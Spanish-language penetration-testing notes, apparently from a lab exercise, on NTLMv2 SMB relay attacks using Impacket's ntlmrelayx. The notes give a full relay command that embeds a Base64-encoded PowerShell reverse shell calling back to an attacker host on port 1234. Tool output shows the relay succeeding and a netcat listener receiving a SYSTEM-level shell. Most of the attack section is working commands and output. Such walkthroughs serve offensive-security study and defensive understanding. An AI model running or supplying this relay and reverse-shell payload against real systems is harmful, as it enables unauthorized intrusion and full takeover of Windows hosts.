# Net-NTLMv2 / SMB Relay Attacks
- Este ataquee se basa en el uso de NTLMv2 para la autenticación de SMB, que es un protocolo de red utilizado para compartir archivos e impresoras en redes Windows. El ataque implica capturar el hash NTLMv2 y luego usarlo para autenticar a un usuario en otro sistema, lo que permite al atacante acceder a recursos protegidos sin necesidad de conocer la contraseña real del usuario.
- Sirve para cuando no somos capaces de crackear el hash NTLMv2, pero tenemos acceso a la red y podemos hacer un relay de la autenticación a otro sistema.

----

- [Más info](https://medium.com/@aniswersighni/active-directory-attacks-smb-relay-attacks-ea7d8cf9a8f8)
- [Fuente de Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-068)

----

## NTLMv2 Relay con Impacket
- Utilizamos el script de impacket ntlmrelayx para realizar el ataque.
- Con la flag `--no-http-server` evitamos que el script levante un servidor HTTP, ya que no lo necesitamos.
- `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."`
    - `-smb2support` habilita el soporte para SMBv2, lo que puede ser necesario en algunas configuraciones de red.
- `-t` especifica el objetivo al que queremos enviar la autenticación.
- `-c` especifica el comando que queremos ejecutar en el objetivo.
    - `powershell -enc JABjAGwAaQBlAG4AdA...` es el comando que queremos ejecutar en el objetivo. En este caso, estamos utilizando PowerShell para ejecutar un comando codificado en Base64, en este caso una reverse shell

### Ejemplo

```bash

┌──(kali㉿kali)-[~]
└─$ sudo impacket-ntlmrelayx -smb2support --no-http-server -t 192.168.207.212 -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAwACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] SMBD-Thread-4 (process_request_thread): Received connection from 192.168.207.211, attacking target smb://192.168.207.212
[*] Authenticating against smb://192.168.207.212 as FILES01/FILES02ADMIN SUCCEED
[*] All targets processed!
[*] SMBD-Thread-6 (process_request_thread): Connection from 192.168.207.211 controlled, but there are no more targets left!
[*] All targets processed!
[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.207.211 controlled, but there are no more targets left!
[*] All targets processed!
[*] SMBD-Thread-8 (process_request_thread): Connection from 192.168.207.211 controlled, but there are no more targets left!
[*] All targets processed!
[*] SMBD-Thread-9 (process_request_thread): Connection from 192.168.207.211 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] All targets processed!
[*] SMBD-Thread-10 (process_request_thread): Connection from 192.168.207.211 controlled, but there are no more targets left!
[*] All targets processed!
[*] SMBD-Thread-11 (process_request_thread): Connection from 192.168.207.211 controlled, but there are no more targets left!
[*] Starting service RemoteRegistry
[*] All targets processed!
[*] SMBD-Thread-12 (process_request_thread): Connection from 192.168.207.211 controlled, but there are no more targets left!
[*] All targets processed!
[*] SMBD-Thread-13 (process_request_thread): Connection from 192.168.207.211 controlled, but there are no more targets left!
[*] Executed specified command on host: 192.168.207.212
[-] SMB SessionError: code: 0xc0000043 - STATUS_SHARING_VIOLATION - A file cannot be opened because the share access flags are incompatible.
[*] Stopping service RemoteRegistry
``` 

-----


```powershell

C:\Windows\system32>dir \\192.168.45.210\test
dir \\192.168.45.210\test
The network name cannot be found.
```

-----

```bash
└─$ sudo nc -lvnp 1234
[sudo] password for kali: 
listening on [any] 1234 ...
connect to [192.168.45.210] from (UNKNOWN) [192.168.207.212] 49756

PS C:\Windows\system32> whoami
nt authority\system
``` 